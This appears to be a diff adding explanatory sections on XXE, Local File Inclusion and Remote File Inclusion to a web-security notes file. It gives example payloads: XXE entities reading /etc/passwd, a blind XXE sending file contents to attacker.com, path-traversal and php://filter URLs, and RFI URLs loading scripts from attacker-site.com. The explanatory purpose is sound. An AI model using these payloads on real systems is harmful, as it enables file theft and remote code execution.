@@ -96,3 +96,108 @@ document.write("Hello, " + name);
 
 If the URL ends with `#<script>alert('XSS')</script>`, the script will be executed.
 
+## XXE
+
+- When we talk about XML External Entity (XXE) Injection, we're referring to a security vulnerability where an attacker 
+can use malicious XML input to access system resources that would normally be unavailable, such as local files or network services. 
+This vulnerability can be exploited in applications that use XML to process inputs, such as web applications or web services.
+An XXE attack typically involves injecting a malicious XML entity into an HTTP request, 
+which is processed by the server and can result in the exposure of sensitive information. For example, an attacker could inject 
+an XML entity that references a file on the server's system and obtain confidential information from that file.
+
+- An XXE attack typically involves injecting a malicious XML entity into an HTTP request, which is processed by the server and can result 
+in the exposure of sensitive information. For example, an attacker could inject an XML entity that references a file on the server's system 
+and obtain confidential information from that file.
+
+- Here are some examples of XXE attacks
+
+### File Disclosure:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+This example attempts to read the contents of the /etc/passwd file on a Unix-based system.
+
+### Blind XXE:
+
+```xml
+<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
+<data>&send;</data>
+```
+
+With evil.dtd containing:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+```
+
+This example demonstrates a blind XXE attack where the content of /etc/passwd is sent to the attacker's server
+
+## Local File Inclusion (LFI)
+
+The Local File Inclusion (LFI) vulnerability is a computer security vulnerability that occurs when a web 
+application does not properly validate user inputs, allowing an attacker to access local files on the web server.
+
+In many cases, attackers exploit the LFI vulnerability by abusing input parameters in the web application. 
+Input parameters are data that users enter into the web application, such as URLs or form fields. 
+Attackers can manipulate input parameters to include local file paths in the request, 
+which can allow them to access files on the web server. This technique is known as "Path Traversal" 
+and is commonly used in LFI attacks.
+
+In a Path Traversal attack, the attacker uses special characters and escape characters 
+in the input parameters to navigate through the web server's directories and access files in sensitive system 
+locations.
+
+For example, the attacker could include "../" in the input parameter to navigate up the directory structure 
+and access files in sensitive system locations.
+
+### Basic LFI
+
+```ruby
+http://vulnerable-site.com/index.php?page=../../../etc/passwd
+```
+This example attempts to access the /etc/passwd file on a Unix-based system.
+
+### Null byte injection:
+```ruby
+http://vulnerable-site.com/index.php?page=../../../etc/passwd%00
+```
+This technique can be used to bypass certain types of input validation
+
+### PHP wrapper
+
+```ruby
+http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+```
+This example uses a PHP wrapper to read and encode the contents of a PHP file.
+
+## Remote File Inclusion (RFI)
+- The Remote File Inclusion (RFI) vulnerability is a security flaw where an attacker can include remote 
+files in a vulnerable web application. 
+This can allow the attacker to execute malicious code on the web server and compromise the system.
+
+- In an RFI attack, the attacker uses user input, such as a URL or form field, to include a remote file 
+in the request. If the web application does not properly validate these inputs, it will process the 
+request and return the content of the remote file to the attacker.
+
+- An attacker can exploit this vulnerability to include malicious remote files containing harmful code, 
+such as viruses or trojans, or to execute commands on the vulnerable server. In some cases, the attacker 
+can direct the request to a PHP resource hosted on their own server, giving them a higher degree of control 
+in the attack.
+
+## Basic RFI attack:
+
+```ruby
+http://vulnerable-site.com/index.php?page=http://attacker-site.com/malicious-script.php
+```
+
+### RFI with PHP wrapper:
+```ruby
+http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=http://attacker-site.com/malicious-script.php
+```
